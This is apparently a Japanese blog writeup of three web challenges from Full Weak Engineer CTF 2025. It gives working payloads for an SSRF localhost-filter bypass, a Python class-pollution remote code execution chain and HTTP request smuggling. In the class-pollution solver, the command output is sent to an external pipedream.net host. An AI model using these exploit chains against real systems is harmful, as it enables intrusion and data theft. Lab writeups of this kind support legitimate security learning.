---
title: Full Weak Engineer CTF 2025 Writeup
date: 2025-08-31
layout: writeup
rank: 2
total_teams: 733
language: ja
tags:
  - Web
---

# まえがき

Full Weak Engineer CTF 2025にチームsknbで参加し、733チーム中2位でした。
1日目の夜にある程度と2日目の夜に少しだけ参加しており、web問は3問解いて1st blood, 2nd solve, 3rd solveが1つずつ。サイクルヒットみたいでかなり嬉しい。

# Writeup

## [web, easy] AED (232 solves)

**2nd Solve🥈**
謎の文字列が表示されるWebページ。
![](/assets/img/full_weak_engineer_ctf_2025/515bb7aa5e3e-20250831.png)

```ts
app.get("/heartbeat", c => {
  const s = getSession(c.get("sid"))
  if (!pwned) {
    const char = DUMMY[Math.floor(Math.random() * DUMMY.length)]
    return c.json({ pwned: false, char })
  }
  if (s.idx === -1) s.idx = 0
  const pos = s.idx
  const char = FLAG[pos]
  s.idx = (s.idx + 1) % FLAG_LEN
  return c.json({ pwned: true, char, pos, len: FLAG_LEN })
})

app2.get("/toggle", c => {
  pwned = true
  sessions.forEach(s => (s.idx = -1))
  return c.text("OK")
})

app.get("/fetch", async c => {
  const raw = c.req.query("url")
  if (!raw) return c.text("missing url", 400)
  let u: URL
  try {
    u = new URL(raw)
  } catch {
    return c.text("bad url", 400)
  }
  if (!isAllowedURL(u)) return c.text("forbidden", 403)
  const r = await fetch(u.toString(), { redirect: "manual" }).catch(() => null)
  if (!r) return c.text("upstream error", 502)
  if (r.status >= 300 && r.status < 400) return c.text("redirect blocked", 403)
  return c.text(await r.text())
})
```

`/fetch`経由でSSRFして`/toggle`を叩くことができればグローバル変数`pwned`がtrueになり、この謎の文字列の代わりにflagが表示されるようになる。

しかし、`url`には以下のような制約がある。

```ts
const isAllowedURL = (u: URL) => u.protocol === "http:" && !["localhost", "0.0.0.0", "127.0.0.1"].includes(u.hostname)
```

この制約を回避しつつ、`http://localhost:4000/toggle`を叩けるURLを探す。
[hacktricks](https://angelica.gitbook.io/hacktricks/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)に載っているものを試していると、`http://①②⑦.⓪.⓪.⓪`が通った。

```
/fetch?url=http://①②⑦.⓪.⓪.⓪:4000/toggle
```

にアクセスし、トップページでflagが表示されるのを待てば良い。
![](/assets/img/full_weak_engineer_ctf_2025/86c6b8801c90-20250831.png)

`fwectf{7h3_fu11_w34k_h34r7_l1v3d_4g41n}`

## [web, medium] Personal Website (11 solves)

**3rd Solve🥉**
自分のユーザー設定を変更することができるwebアプリ。サーバー内に`readflag`という実行ファイルがあるので、それを実行すればflagが得られる。つまりRCEが必要。
ユーザーからのjsonをそのままmergeしているメソッドがある。明らかに怪しい。

```py
    @staticmethod
    def merge_info(src, user, *, depth=0):
        if depth > 3:
            raise Exception("Reached maximum depth")
        for k, v in src.items():
            if hasattr(user, "__getitem__"):
                if user.get(k) and type(v) == dict:
                    User.merge_info(v, user.get(k),depth=depth+1)
                else:
                    user[k] = v
            elif hasattr(user, k) and type(v) == dict:
                User.merge_info(v, getattr(user, k),depth=depth+1)
            else:
                setattr(user, k, v)
```

pythonにもjavascriptのprototype pollution的なものがあったような気がして調べていると、チームメイトが[class pollutionの記事](https://www.offensiveweb.com/docs/programming/python/class-pollution/)を教えてくれた。問題でもjinjaを使用しており、ものすごくこれっぽい。
`depth <= 3`の制約を無くしたローカル環境ではjinjaのキャッシュがない（過去に一度もアクセスしていない）時にこのpayloadがそのまま刺さることを確認したが、問題の本番環境ではどうにかしてこの制約を回避する必要がある。

ここで、`__class__.merge_info.__kwdefaults__`というメソッドの存在を知った。これは関数引数のデフォルト値を指しており、ここの`depth`をものすごく小さい値に上書きすることができれば制約を回避して本命のpayloadを刺せる。そしてこれは`depth <= 3`の制約下でも上書き可能。

最終的なsolverはこうなる。

```sh
COOKIE=cookie.txt
BASE=http://xxxxxxxx.chal2.fwectf.com:8006

curl -s -c "$COOKIE" -X POST "$BASE/register" -d 'username=a&password=a'
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "$BASE/login" -d 'username=a&password=a'

curl -s -b "$COOKIE" -H 'Content-Type: application/json' \
  -d '{
    "__class__": {
      "merge_info": {
        "__kwdefaults__": { "depth": -1000000000 }
      }
    }
  }' "$BASE/api/config"

curl -s -b "$COOKIE" -H 'Content-Type: application/json' \
  -d '{
    "__init__": {
      "__globals__": {
        "__loader__": {
          "__init__": {
            "__globals__": {
              "sys": {
                "modules": {
                  "jinja2": {
                    "runtime": {
                      "exported": [
                        "*;import urllib.request,urllib.parse,subprocess,base64;f=base64.b64encode(subprocess.check_output([\"/readflag\"])).decode();urllib.request.urlopen(\"https://xxxxxxxx.m.pipedream.net\",data=urllib.parse.urlencode({\"f\":f}).encode());#"
                      ]
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }' "$BASE/api/config"
```

これを**jinjaのキャッシュがない（一度もアクセスしていない）本番環境に向けて**実行した後このユーザーでログインすると、RCEが発火してflagが外部へ送信される。
`fwectf{__m3R6e_H4_MAj1_Kik3N__be1ba703bb4b43d19c04500619afe377}`

## [web, medium] SotaFuji (1 solve✨)

**1st Blood🩸**
proxy（node製）とweb（go製）の二段構成になっており、webの`/flag`にアクセスできればそのままflagが得られるが、proxyを経由するため通常`/`にしかアクセスできない。

しかし、もしhttp request smugglingができれば`/flag`へもアクセスすることができる。よって、以下のようなhttp requestを送りたい。

```
GET / HTTP/1.1
Host: vuln

GET /flag HTTP/1.1
Host: vuln

```

しかし、proxy側ではvalidationが行われており、単純なsmugglingはできないように見える。

```js
function validateAndGetContentLength(buffer, isRequest) {
  if (!isAllAscii(buffer)) {
    throw Error("Bad header");
  }
  const bufferStr = buffer.toString();
  const headerLines = bufferStr.split("\r\n");
  const firstLineSplitted = headerLines[0].split(" ");
  if (isRequest && firstLineSplitted[1] !== "/") {
    throw Error("Bad header");
  }
  if (!isRequest && headerLines[0] !== "HTTP/1.1 200 OK") {
    throw Error("Bad header");
  }
  const headers = new Map();
  for (let headerLine of headerLines.slice(1)) {
    const index = headerLine.indexOf(":");
    if (index === -1) {
      throw Error("Bad header");
    }
    const k = headerLine.slice(0, index);
    const v = headerLine.slice(index + 1);
    headers.set(k.trim().toLowerCase(), v.trim());
  }
  if (headers.has("transfer-encoding")) {
    throw Error("Bad header");
  }
  return parseInt(headers.get("content-length") ?? "0");
}
```

ここで、nodeとgoの挙動差を利用する。nodeでは`\r\n`をhttp requestの改行として処理する実装になっているが、goのnet/httpでは`\n`もhttp requestの改行として処理する。
よって、http requestの改行を`\n`でpayloadを構築するとproxy側で最初の行の`HTTP/1.1`以降が無視され、http request smugglingが成立する。

しかし、このままではnode側は当然1リクエストとして処理するため、2リクエスト目にあたる`/flag`のレスポンスが破棄されてしまう。
これに対しては、1リクエスト目をHEADメソッドにすることでsmuggledされた不正な`content-length`分のレスポンス（2リクエスト目のwebからのレスポンスを含む）を返すようになり、flagが得られた。

よって、以下のpayloadをsocketで送ればflagが得られる。（完全なsolverは諸事情により非公開）

```py
payload = (
    "HEAD / HTTP/1.1\n"
    "Host: vuln\n"
    "\n"
    "GET /flag HTTP/1.1\n"
    "Host: vuln\n"
    "\n"
    "\r\n\r\n"
).encode("ascii")
```

`fwectf{pr0_sh0G1_Ki5hI_N07_g0_kI5H1}`

# あとがき

さすがt-chenさんという感じで手ごたえのある問題が多く、とても楽しかったです。あまり時間が取れずhard問はノータッチになってしまいましたが、ちゃんと復習します。
あとは自分語りになってしまいますが、最近はある程度の難易度の問題を解く速度が上がってきてDiscordのsolveチャンネルでメダルの絵文字を見ることが増えてきました。CTF楽しいです。
